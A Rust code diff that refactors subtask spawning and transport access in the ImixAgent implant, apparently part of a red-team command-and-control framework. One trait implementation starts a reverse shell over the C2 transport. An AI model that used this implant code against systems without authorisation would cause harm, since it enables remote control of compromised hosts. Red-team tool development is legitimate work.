@@ -1,5 +1,6 @@
 use anyhow::{Context, Result};
-use eldritchv2::{Agent, pivot::ReplHandler};
+use eldritch_agent::{Agent, SubtaskFuture};
+use eldritchv2::pivot::ReplHandler;
 use pb::c2::{self, ClaimTasksRequest};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
@@ -145,7 +146,7 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
         self.runtime_handle.block_on(future)
     }
 
-    pub fn get_sync_transport(&self) -> Arc<dyn SyncTransport> {
+    pub fn get_sync_transport_internal(&self) -> Arc<dyn SyncTransport> {
         Arc::new(SyncTransportAdapter::new(
             self.transport.clone(),
             self.runtime_handle.clone(),
@@ -166,7 +167,8 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
         })
     }
 
-    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
+    // Legacy internal helper - can be deprecated or kept if used elsewhere.
+    fn spawn_subtask_internal<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
     where
         F: FnOnce(T) -> Fut + Send + 'static,
         Fut: std::future::Future<Output = Result<()>> + Send + 'static,
@@ -192,9 +194,26 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
         }
         Ok(())
     }
+
+    fn spawn_subtask(&self, task_id: i64, name: String, future: SubtaskFuture) -> Result<(), String> {
+        #[cfg(debug_assertions)]
+        log::info!("Spawning subtask: {name} for task {task_id}");
+
+        let handle = self.runtime_handle.spawn(future);
+        self.task_registry.register_subtask(task_id, name, handle);
+        Ok(())
+    }
+
 }
 
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
+    fn spawn_subtask(&self, task_id: i64, name: String, future: SubtaskFuture) -> Result<(), String> {
+        self.spawn_subtask(task_id, name, future)
+    }
+
+    fn get_sync_transport(&self) -> Option<Arc<dyn SyncTransport>> {
+        Some(self.get_sync_transport_internal())
+    }
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
         let mut map = BTreeMap::new();
         let cfg = self
@@ -347,7 +366,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 impl<T: Transport + Send + Sync + 'static> ReplHandler for ImixAgent<T> {
     fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
         let agent = self.clone();
-        self.spawn_subtask(task_id, move |transport| async move {
+        self.spawn_subtask_internal(task_id, move |transport| async move {
             run_repl_reverse_shell(task_id, transport, agent).await
         })
     }
